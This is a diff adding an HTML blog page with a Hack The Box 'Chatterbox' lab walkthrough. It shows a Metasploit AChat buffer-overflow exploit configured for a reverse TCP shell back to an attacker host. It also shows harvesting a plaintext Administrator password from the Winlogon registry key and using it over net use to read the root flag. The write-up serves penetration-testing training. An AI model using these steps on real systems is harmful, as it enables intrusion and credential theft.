@@ -1,0 +1,454 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>HTB Chatterbox | Jenn Shagrin</title>
+<meta name="description" content="Hack The Box Chatterbox: AChat buffer overflow, a fragile reverse shell, and Administrator credentials in Winlogon.">
+<meta name="author" content="">
+<link rel="canonical" href="https://jennshaggy.github.io/htb-chatterbox.html">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.40a236105b83b1f05a55d0a48876965b59b1d8f81f351041e484dc5905b375dc.css" rel="preload stylesheet" as="style">
+    <link rel="stylesheet" href="/assets/css/accents.css">
+<link rel="icon" href="https://jennshaggy.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jennshaggy.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jennshaggy.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jennshaggy.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jennshaggy.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+            .list {
+                background: var(--theme);
+            }
+            .toc {
+                background: var(--entry);
+            }
+        }
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/mobile-nav.css">
+<link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&amp;family=Source+Code+Pro:wght@400;500;600&amp;family=Tomorrow:wght@500;600;700&amp;display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/site-ui-lab.css">
+<meta property="og:url" content="https://jennshaggy.github.io/htb-chatterbox.html">
+<meta property="og:site_name" content="Jenn Shagrin">
+<meta property="og:title" content="HTB Chatterbox">
+<meta property="og:description" content="Hack The Box Chatterbox: AChat buffer overflow, a fragile reverse shell, and Administrator credentials in Winlogon.">
+<meta property="og:locale" content="en-us">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="HTB Chatterbox">
+<meta name="twitter:description" content="Hack The Box Chatterbox: AChat buffer overflow, a fragile reverse shell, and Administrator credentials in Winlogon.">
+</head>
+
+<body id="top">
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jennshaggy.github.io/" accesskey="h" title="Jenn Shagrin (Alt + H)">Jenn Shagrin</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+                <button id="menu-toggle" type="button" aria-expanded="false" aria-controls="menu"><span class="menu-toggle-label">Menu</span><span class="menu-toggle-icon" aria-hidden="true"><span></span><span></span></span></button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="/security-defense/" title="Security &amp; Defense">
+                    <span>Security &amp; Defense</span>
+                </a>
+            </li>
+            <li>
+                <a href="/networking.html" title="Networking">
+                    <span>Networking</span>
+                </a>
+            </li>
+            <li>
+                <a href="/systems-foundation.html" title="Systems">
+                    <span>Systems</span>
+                </a>
+            </li>
+            <li>
+                <a href="/penetration-testing.html" title="Penetration Testing">
+                    <span class="active">Penetration Testing</span>
+                </a>
+            </li>
+            <li>
+                <a href="/platforms-training.html" title="Training">
+                    <span>Training</span>
+                </a>
+            </li>
+            <li>
+                <a href="/ai-security/" title="AI Security">
+                    <span>AI Security</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+
+<main class="main">
+<article class="post-single technical-writeup">
+<header class="post-header">
+<h1 class="post-title entry-hint-parent">HTB Chatterbox</h1>
+<div class="post-description">Hack The Box challenge: AChat buffer overflow, a command shell that finally stayed open, and Administrator access.</div>
+</header>
+<div class="post-content">
+<h2>Reconnaissance</h2>
+
+<p>Let's create a dedicated assessment directory, <code>cd</code> into it, export our target IP as an environmental variable, and get our scan on.</p>
+
+<pre><code>mkdir chatterbox
+tip=10.129.108.177
+echo $tip</code></pre>
+
+<pre><code>cd chatterbox</code></pre>
+
+<p>We'll start up Rustscan next:</p>
+
+<pre><code>rustscan -a $tip -b 5000 -r 1-65535 --exclude-ports 9999 -- -A -n -T4 --max-retries 1 --min-rate 1000 -oA chatterbox_rust_scan</code></pre>
+
+<p>Rustscan is about halfway complete. It's passing everything over to Nmap right now, but here's the initial open ports list:</p>
+
+<pre><code>Open 10.129.108.177:135
+Open 10.129.108.177:139
+Open 10.129.108.177:445
+Open 10.129.108.177:9255
+Open 10.129.108.177:9256
+Open 10.129.108.177:49152
+Open 10.129.108.177:49153
+Open 10.129.108.177:49154
+Open 10.129.108.177:49156
+Open 10.129.108.177:49155
+Open 10.129.108.177:49157</code></pre>
+
+<p>Here's Nmap's easier to read breakdown:</p>
+
+<img src="/images/htb-chatterbox/rustscan-open-ports.png" alt="rustscan open ports" loading="lazy">
+
+<p>Nmap's projected services list, OS estimations, HTTP information, and more useful information:</p>
+
+<img src="/images/htb-chatterbox/nmap-service-scan.png" alt="nmap service scan" loading="lazy">
+
+<p>And...</p>
+
+<p>We have quite a bit of information to start with. We definitely have enough to answer the first flag question, but don't let this question trick you: <code>How many TCP ports outside of the default nmap top 1000 are listening on Chatterbox?</code></p>
+
+<p>You don't just count the port numbers higher than 1000. Nmap's top 1000 is its 1000 most common TCP ports. If you check <a href="https://github.com/nmap/nmap/blob/master/nmap-services">Nmap's port popularity list</a>, ports 49152 - 49157 are in the top 1000.</p>
+
+<h2>AChat on port 9256</h2>
+
+<p>The chat service on port 9256 is our next lead: <code>What is the name of the chat service running on port 9256?</code></p>
+
+<img src="/images/htb-chatterbox/achat-service.png" alt="achat service" loading="lazy">
+
+<p>There is a known buffer overflow in this version of AChat. I want to check which UDP port the exploit uses.</p>
+
+<pre><code>msfconsole
+search achat</code></pre>
+
+<img src="/images/htb-chatterbox/metasploit-achat-search.png" alt="metasploit achat search" loading="lazy">
+
+<p>Our options are limited to in a good way. You can alternatively search <code>exploit-db.com</code> and find the same result. It points you right back to Metasploit:</p>
+
+<p>The UDP port is much faster to locate in the exploit code on <code>Exploit-DB</code>:</p>
+
+<img src="/images/htb-chatterbox/achat-exploit-source.png" alt="achat exploit source" loading="lazy">
+
+<p>Our next goal is to run the <code>achat_bof</code> exploit in <code>msfconsole</code> and identify the user running AChat.</p>
+
+<pre><code>use 0
+options</code></pre>
+
+<p>You don't really have to re-set the LPORT, but I went ahead and re-set it:</p>
+
+<pre><code>set RHOSTS &lt;TARGET_IP&gt;
+set LHOST &lt;ATTACKER_IP&gt;
+set LPORT 4444</code></pre>
+
+<p>Back in our <code>msfconsole</code> terminal:</p>
+
+<pre><code>run</code></pre>
+
+<h2>Finding a shell that stays open</h2>
+
+<p>Just an update: I've had endless issues with the connection dying. I was able to sneak in a quick <code>whoami</code> before this session died:</p>
+
+<p>This is ridiculous. I've reset the box, tried different available listening ports.</p>
+
+<p>Every. Dang. Time. The exploit died:</p>
+
+<img src="/images/htb-chatterbox/meterpreter-session-died.png" alt="meterpreter session died" loading="lazy">
+
+<p>The exploit code on <code>Exploit-DB</code> warns that it is timing-sensitive. Two AChat threads concurrently overflow, and the default is <code>EXITFUNC=process</code>. The Meterpreter host process keeps collapsing.</p>
+
+<p>Let's test migrating before Meterpreter initializes. Exit <code>msfconsole</code>, then rerun <code>msfconsole</code> (or <code>msfconsole -q</code> to speed it up):</p>
+
+<pre><code>set PAYLOAD windows/meterpreter/reverse_tcp
+set RHOSTS 10.129.108.212
+set RPORT 9256
+set LHOST 10.10.14.36
+set LPORT 4444
+set EXITFUNC thread
+set PrependMigrate true
+set PrependMigrateProc notepad.exe</code></pre>
+
+<p><code>PrependMigrate</code> will move the payload into a new process before the Meterpreter session starts and before <code>AutoRunScript</code>, which depends on Meterpreter and its extensions initializing. If execution returns, <code>EXITFUNC thread</code> avoids intentionally terminating the entire AChat process.</p>
+
+<pre><code>show advanced
+run</code></pre>
+
+<p>Alrighty. Let's run this.</p>
+
+<p>And it failed again.</p>
+
+<p>Let's do a post-session migration:</p>
+
+<pre><code>set PrependMigrate false
+set EXITFUNC thread
+set AutoRunScript post/windows/manage/migrate SPAWN=true
+run</code></pre>
+
+<p>Progress, but still not connecting to the target.</p>
+
+<p>Let's test the timing and see if it helps:</p>
+
+<pre><code>set WfsDelay 15
+run</code></pre>
+
+<img src="/images/htb-chatterbox/meterpreter-timeout.png" alt="meterpreter timeout" loading="lazy">
+
+<p>The session dies before <code>AutoRunScript</code> starts, so the normal autorun hook is too late.</p>
+
+<p>I'm restarting this box once more. After it's done restarting, we'll put these configs into <code>msfconsole</code>:</p>
+
+<pre><code>set RHOSTS 10.129.108.218
+unset AutoRunScript
+set InitialAutoRunScript migrate -f
+set PrependMigrate false
+set EXITFUNC thread
+set WfsDelay 15
+run</code></pre>
+
+<p>I swear this machine is designed to test patience and ingenuity. Fine. I'll tango.</p>
+
+<p>We'll run a staged command shell, effectively completely avoiding Meterpreter's extension/bootstrap:</p>
+
+<pre><code>unset InitialAutoRunScript
+unset AutoRunScript
+set PAYLOAD windows/shell/reverse_tcp
+set RHOSTS 10.129.108.218
+set LHOST 10.10.14.36
+set LPORT 4444
+set EXITFUNC thread
+set WfsDelay 15
+run</code></pre>
+
+<img src="/images/htb-chatterbox/working-command-shell.png" alt="working command shell" loading="lazy">
+
+<p>THANK F*&amp;K.</p>
+
+<pre><code>whoami
+hostname</code></pre>
+
+<p>We are going to preserve this NOW:</p>
+
+<pre><code>Ctrl-Z
+y
+sessions
+sessions -i 3</code></pre>
+
+<img src="/images/htb-chatterbox/shell-session-proof.png" alt="shell session proof" loading="lazy">
+
+<p>Before I tear this machine apart, these are the final working configs:</p>
+
+<pre><code>PAYLOAD windows/shell/reverse_tcp
+RHOSTS 10.129.108.218
+RPORT 9256
+LHOST 10.10.14.36
+LPORT 4444
+EXITFUNC thread
+WfsDelay 15</code></pre>
+
+<h2>Alfred and Administrator</h2>
+
+<p>Let's move into Alfred's profile:</p>
+
+<pre><code>cd /d C:\Users\Alfred
+dir /a</code></pre>
+
+<p>Now we can start looking for the user flag in reasonable places:</p>
+
+<pre><code>dir Desktop
+type Desktop\user.txt</code></pre>
+
+<img src="/images/htb-chatterbox/user-flag-redacted.png" alt="user flag redacted" loading="lazy">
+
+<p>Moving on.</p>
+
+<pre><code>whoami /priv
+cmdkey /list</code></pre>
+
+<p>Alfred has regular ole' user privileges. Credential Manager beholds no usable credentials.</p>
+
+<p>This box throws strong hints by way of the flag questions that the Administrator password is stored as a config secret.</p>
+
+<p>Let's test my hypothesis:</p>
+
+<pre><code>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | findstr /i "DefaultUserName DefaultPassword"</code></pre>
+
+<img src="/images/htb-chatterbox/winlogon-credential.png" alt="winlogon credential" loading="lazy">
+
+<p>Score. A plaintext logon credential. If password reuse isn't intended here, I'll eat my words.</p>
+
+<p>Let's test the password against the Administrator account in a way that avoids fighting with <code>runas</code> inside a non-interactive reverse shell:</p>
+
+<pre><code>net use \\127.0.0.1\IPC$ /user:Administrator Welcome1!</code></pre>
+
+<img src="/images/htb-chatterbox/administrator-share-auth.png" alt="administrator share auth" loading="lazy">
+
+<p>Not eating my words today. We have our Admin password.</p>
+
+<p>Let's use the same authenticated connection process to grab the Administrator flag:</p>
+
+<pre><code>type \\127.0.0.1\c$\Users\Administrator\Desktop\root.txt</code></pre>
+
+<img src="/images/htb-chatterbox/administrator-flag-redacted.png" alt="administrator flag redacted" loading="lazy">
+
+<p>I can't believe how much time I just spent on Metasploit configs. Lesson learned.</p>
+</div>
+<footer class="post-footer"></footer>
+</article>
+</main>
+
+<footer class="footer">
+    <span>&copy; 2026 <a href="https://jennshaggy.github.io/">Jenn Shagrin</a></span> ·
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &amp;
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({ behavior: "smooth" });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+</script>
+<script>
+(()=>{const t=document.getElementById("menu-toggle"),m=document.getElementById("menu");if(!t||!m)return;document.documentElement.classList.add("js-menu-ready");const close=(focus=false)=>{t.setAttribute("aria-expanded","false");m.classList.remove("menu-open");if(focus)t.focus()};t.addEventListener("click",()=>{const open=t.getAttribute("aria-expanded")==="true";t.setAttribute("aria-expanded",String(!open));m.classList.toggle("menu-open",!open)});m.addEventListener("click",e=>{if(e.target.closest("a"))close()});document.addEventListener("click",e=>{if(t.getAttribute("aria-expanded")==="true"&&!m.contains(e.target)&&!t.contains(e.target))close()});document.addEventListener("keydown",e=>{if(e.key==="Escape"&&t.getAttribute("aria-expanded")==="true")close(true)});window.matchMedia("(min-width: 769px)").addEventListener("change",e=>{if(e.matches)close()})})();
+</script>
+<!-- Cloudflare Web Analytics --><script type='module' src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "d29793993e20413c866dbc989486b294"}'></script><!-- End Cloudflare Web Analytics -->
+</body>
+</html>
